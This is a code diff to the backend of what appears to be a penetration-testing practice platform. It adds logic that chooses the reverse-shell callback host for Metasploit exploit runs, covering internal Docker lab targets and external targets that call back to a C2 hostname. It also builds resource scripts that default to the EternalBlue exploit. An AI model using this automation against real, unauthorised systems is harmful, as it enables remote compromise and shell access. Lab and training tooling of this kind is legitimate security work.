@@ -4298,11 +4298,47 @@ async def _auto_detect_payload(module: str, preferred: str = "") -> str:
     return payloads[0]
 
 
+def _resolve_lhost_for_target(target: str, user_lhost: str) -> str:
+    """Pick the right LHOST for a given target.
+
+    Internal Docker lab containers (lab_*) can't reach c2.vulnuslab.com because
+    that resolves to the host's PUBLIC IP — packets would have to leave the
+    Docker bridge, hit the public internet, and hairpin back to the same host,
+    which most Docker network drivers silently drop. The cleanest path is for
+    the target container to connect to the backend container directly over
+    the shared oscp_net bridge, addressed by its Docker DNS hostname.
+
+    External targets keep c2.vulnuslab.com (the user's public-facing handle).
+    Also resolves any hostname to an IPv4 so Metasploit's strict option
+    validator accepts it.
+    """
+    t = (target or "").lower().strip()
+    is_internal = t.startswith("lab_") or t in {"localhost", "127.0.0.1"} or t.startswith(("10.", "172.", "192.168."))
+    if is_internal:
+        # Use the backend container's own Docker DNS name. Reverse-shell
+        # handler is bound inside this same container, so this is a 1-hop
+        # connection over the Docker bridge.
+        return "oscp_backend"
+    # External target: keep what the user supplied. Resolve hostname → IP
+    # because MSF rejects some hostnames in OptionValidator.
+    if user_lhost and not re.match(r"^\d+\.\d+\.\d+\.\d+$", user_lhost):
+        try:
+            import socket as _socket
+            return _socket.gethostbyname(user_lhost)
+        except Exception:
+            return user_lhost
+    return user_lhost
+
+
 @app.post("/api/exploit/msf")
 async def exploit_msf(req: ExploitRequest, user=Depends(verify_token)):
     host = _recon_host(req.target) if req.target else req.target
     if not host:
         return {"error": "Target required"}
+    # Auto-select the right LHOST: internal Docker lab targets use the backend
+    # container's Docker DNS name (oscp_backend), external targets use the
+    # public-facing c2.vulnuslab.com (resolved to IP for MSF validator).
+    effective_lhost = _resolve_lhost_for_target(req.target or "", req.lhost or "")
     module  = req.msf_module  or "exploit/windows/smb/ms17_010_eternalblue"
     # Trust the payload the frontend supplied — practice targets ship with a
     # known-good (module, payload) pair. The previous auto-detect logic
@@ -4321,26 +4357,19 @@ async def exploit_msf(req: ExploitRequest, user=Depends(verify_token)):
     is_reverse = not any(x in payload for x in ["interact", "bind", "find_tag"])
     # LHOST only required for reverse-shell payloads — backdoor/interact
     # payloads (like cmd/unix/interact for vsftpd 2.3.4) don't need it.
-    if is_reverse and not req.lhost:
+    if is_reverse and not effective_lhost:
         return {"error": "LHOST required for reverse payload " + payload}
-    lhost_block = f"set LHOST {req.lhost}\nset LPORT {req.lport}\n" if is_reverse and req.lhost else ""
+    lhost_block = f"set LHOST {effective_lhost}\nset LPORT {req.lport}\n" if is_reverse and effective_lhost else ""
 
-    # Backdoor / pre-installed-shell modules (vsftpd_234, distcc_exec, samba
-    # usermap_script, unreal_ircd_3281, ircd backdoors) each ship with a
-    # known-good DEFAULT payload — overriding it with our own "set PAYLOAD"
-    # line was causing Metasploit to reject incompatible architectures (e.g.
-    # picking a Windows shell for a Unix backdoor). Skip the override for
-    # these modules and let MSF use its module-internal default.
-    backdoor_indicators = ["backdoor", "ircd", "vsftpd", "distcc", "samba/usermap", "unreal_ircd"]
-    is_backdoor_module = any(b in module.lower() for b in backdoor_indicators)
-    payload_block = "" if is_backdoor_module else f"set PAYLOAD {payload}\n"
-
+    # For "interact"-style backdoor payloads, MSF needs the backdoor's listen
+    # port (DPORT for vsftpd 2.3.4 = 6200), not LHOST/LPORT. The default in
+    # the module is correct, so we don't override.
     rc = (
         f"use {module}\n"
         f"set RHOSTS {host}\n"
         f"set RPORT {req.port}\n"
         + lhost_block +
-        payload_block +
+        f"set PAYLOAD {payload}\n"
         f"set ExitOnSession false\n"
         f"run -j\n"
         f"sleep 25\n"
